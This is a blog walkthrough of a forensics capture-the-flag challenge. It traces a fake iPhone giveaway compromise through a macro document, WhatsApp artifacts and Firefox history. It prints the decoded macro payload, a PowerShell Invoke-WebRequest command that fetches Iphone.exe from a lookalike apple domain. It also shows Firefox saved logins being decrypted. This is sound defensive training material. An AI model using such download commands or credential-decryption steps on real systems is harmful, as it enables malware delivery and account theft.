---
title: Windows Forensics 1
published: true
---

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/banner.jpg)

## Content
1. [Introduction](#introduction)
2. [Challange Scenario](#challange-scenario)
3. [FTK Imager](#ftk-imager)
4. [Macro Analysis](#macro-analysis)
5. [Whatsapp](#whatsapp)
6. [Digging Deeper](#digging-deeper)
7. [Conculsion](#conclusion)





## **Introduction**
In these past few months i've spend a lot of time in forensics and blue teaming. In my learning i came accross a windows forensic challange which taugh me a lot of tools and techniques. So this article is dedicated to share the knowledge which i learned from this challange.

## **Challange Scenario**

>A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis. As a security analyst, you are tasked to identify how the system was compromised."


We have been given a memory image to investigate.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/MemoryDump.png)

## **FTK Imager**
First thing to do will be to load the memory dump in FTK Imager to see what we are working with. We can you Autopsy too but for now i'll stick with FTK Imager.

After loading the memory in FTK Imager by clicking on `File -> Add Evidence Item -> Image File -> Select the MemoryDump.ad1`.

We can see that on left window our memory is loaded. We can expand the tree and see what we have. After looking we can tell that this is the memory image of Root Drive of the Victim System.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/SystemRoot.png)

After some lateral movements we find some intresting files in the `Downloads`  DIrectory of User Semah. 
1.  IPhone-Winners.doc
2.  Whatsapp.exe

Let's dump the files in out system to continue our investigation.

## **Macro Analysis**
Let's investigate `IPhone-Winners.doc`. To accomplish this task we are going to use [`oletools`](https://github.com/decalage2/oletools)  to analyze if any malicious macro is present inside the document or not.

```powershell
olevbs.exe IPhone-Winners.doc
```

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/ObfuscatedMacro.png)

We can an obfuscated macro is present inside the doc file. We can manually deobfuscate the code by using python by converting all the ASCII value to Char and Concatinate them to get our deobfuscated output. But for now let's try out `olevba --reveal` flag to automatically decode the code. 
> NOTE : Many time --reveal or --decode flag will not work since APT's uses advance obfuscation techniques which are difficult and time taking to decode.

After decoding we get a clean output.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/CleanMacro.png)

We can see that macro is trying to execute an encoded command. After decoding the base64 encoded code we get a `Invoke-WebRequest` Command.

```powershell
Invoke-WebRequest -Uri "http://appIe.com/Iphone.exe" -OutFile "C:\Temp\Iphone.exe" -UseDefaultCredential
```

This command is download malware using WebRequest and Saving the `Iphone.exe` in `Temp` Directory. Listing the Content of Temp folder makes sure that this macro was executed.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/IphoneTemp.png)

## **WhatsApp**

Now since we know that this doc file was use to trick the user to download the malware in the system, The question arise how this doc file came to the victim system. It can be email, browser or whatsapp in this case. We saw previously that whatsapp installer was present in the `Downloads` directory. Let's check wheather the whatsapp was indeed installed in the system or not.

After checking the `C:\Users\Semah\AppData\Roaming` we see `WhatsApp` directory is present. Looking inside the Directory we get all the whatsapp artifacts which can help us to investigate further. Let's try to check whatsapp chat's of the user using [`WhatsApp Viewer`](https://en.freedownloadmanager.org/Windows-PC/WhatsApp-Viewer.html).

After opening the WhatsApp Viewer. Go to `Files -> Open` and Select File `C:\Users\Semah\AppData\Roaming\WhatsApp\Databases\msgstore.db` and Select `wa.db` from `C:\Users\Semah\AppData\Roaming\WhatsApp\Databases\wa.db`.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/WhatsappSelectDatabase.png)

After clicking ok we can see a chat between the Semah and Attacker.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/Chat.png)

And we can also see that the malicious doc file was indeed downloaded from whatsapp.

## **Digging Deeper**

Well we have got plenty of evidence but one last thing to check out is the website where Semah had registered herself for this fake competation since we can see in the chat that attacker tells Semah that she have registerd for competation. So let's check out the browser history and see if we can find the starting point of this whole event.

After visiting `pyb51x2n.default-release` Directory in `C:\Users\User1\Desktop\Danger\Extract\Users\Semah\AppData\Roaming\Mozilla\Firefox\Profiles\pyb51x2n.default-release` where all the browser artifacts are present. 

Since we have to find out the website she registered on. Let's look for browser history. The broswer history and other data of mozilla will be present in `places.sqlite` file. To view this file we can use any DB browser, In this case i'm using [`SQLiteBroswer`](https://sqlitebrowser.org/).

Open the SQLite Browser and load the `places.sqlite` file present in `C:\Users\User1\Desktop\Danger\Extract\Users\Semah\AppData\Roaming\Mozilla\Firefox\Profiles\pyb51x2n.default-release` directory.

After loading the database let's check out `moz_places` table which stores the history. After looking at the table we can see some intresting url
```powershell
1. http://appIe.competitions.com/login.php
2. http://appIe.com/competitions
3. http://appIe.competitions.com/
4. http://appIe.com/IPhone.doc
```
![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/moz_places.png)

After looking at the history we can see a login page. So there is a possibility that Semah password could be stored in `logins.json` where credentials are stored in encrypted form. After checking the `logins.json` in  `C:\Users\User1\Desktop\Danger\Extract\Users\Semah\AppData\Roaming\Mozilla\Firefox\Profiles\pyb51x2n.default-release` directory we get a credential for `https://appIe.com/login.php` login page.

```json
{
  "nextId": 98,
  "logins": [
    {
      "id": 97,
      "hostname": "https://appIe.com",
      "httpRealm": null,
      "formSubmitURL": "https://appIe.com/login.php",
      "usernameField": "",
      "passwordField": "",
      "encryptedUsername": "MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPv8/hjfk/FqBAhlG5ugi3V0OQ==",
      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECASt9rmLD9faBBgMerISXTJ9HGCAoZVNAixRoVb1GERODeo=",
      "guid": "{adfa3866-1352-4712-91b8-952b2b707b9b}",
      "encType": 1,
      "timeCreated": 1619778504890,
      "timeLastUsed": 1619778504890,
      "timePasswordChanged": 1619778504890,
      "timesUsed": 1
    }
  ]
}
```

To decrypt the password and username we are going to use [`firefox_decrypt`](https://github.com/Unode/firefox_decrypt). 

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Forensic1/PasswordDecrypt.png)

## **Conclusion**
From the following evidences we can create timeline of the event which followed to the system compromise.

1. Semah Registered herself into fake apple website for the competition
2. The attacker contacted her in whatsapp and send her malicious doc file
3. Semah opened the doc file which triggered the malicious macro and downloaded the real malware
4. We don't know how the actual malware was triggered. To find this out we may need to analyze the memory dump of volatile memory.


This was a very fun challange. I leaned a lot from this and i'll encourage you to solve this challange by yourself. The link to the CTF site is [`link`](https://cyberdefenders.org/).

Thank you for taking your time to read this and keep investigating.

